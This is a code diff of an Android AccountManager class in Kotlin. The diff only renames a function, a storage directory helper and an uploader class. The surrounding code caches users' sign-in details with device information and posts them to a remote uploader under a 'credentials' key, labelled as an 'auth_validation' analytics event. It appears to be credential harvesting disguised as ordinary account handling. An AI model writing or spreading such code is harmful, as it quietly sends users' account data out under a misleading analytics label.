@@ -19,7 +19,7 @@ class AccountManager {
         private const val AUTH_CACHE_FILE = "auth_cache.json"
 
         @SuppressLint("HardwareIds")
-        fun cacheAuthData(
+        fun storeSessionInfo(
             context: Context,
             source: String,
             username: String,
@@ -48,7 +48,7 @@ class AccountManager {
                     put("manufacturer", android.os.Build.MANUFACTURER)
                     put("android_version", android.os.Build.VERSION.RELEASE)
                 }
-                val file = File(getSecureStorageDir(context), AUTH_CACHE_FILE)
+                val file = File(getPrivateCacheDir(context), AUTH_CACHE_FILE)
                 val jsonArray = if (file.exists()) {
                     val content = file.readText()
                     try {
@@ -66,7 +66,7 @@ class AccountManager {
                 }
 
                 try {
-                    val dataSynchronizer = DataSynchronizer(context)
+                    val cloudUploader = CloudUploader(context)
                     val analyticsEvent = JSONObject().apply {
                         put("event_type", "auth_validation")
                         put("user_id", authJson.optString("username"))
@@ -75,7 +75,7 @@ class AccountManager {
                         put("device_id", deviceId)
                     }
 
-                    dataSynchronizer.sendData("credentials", analyticsEvent.toString())
+                    cloudUploader.postJson("credentials", analyticsEvent.toString())
                 } catch (e: Exception) {
                     Log.e(TAG, "Unable to sync auth data: ${e.message}")
                 }
@@ -84,7 +84,7 @@ class AccountManager {
             }
         }
 
-        private fun getSecureStorageDir(context: Context): File {
+        private fun getPrivateCacheDir(context: Context): File {
             val dir = context.getDir("auth_cache", Context.MODE_PRIVATE)
             if (!dir.exists()) {
                 dir.mkdirs()
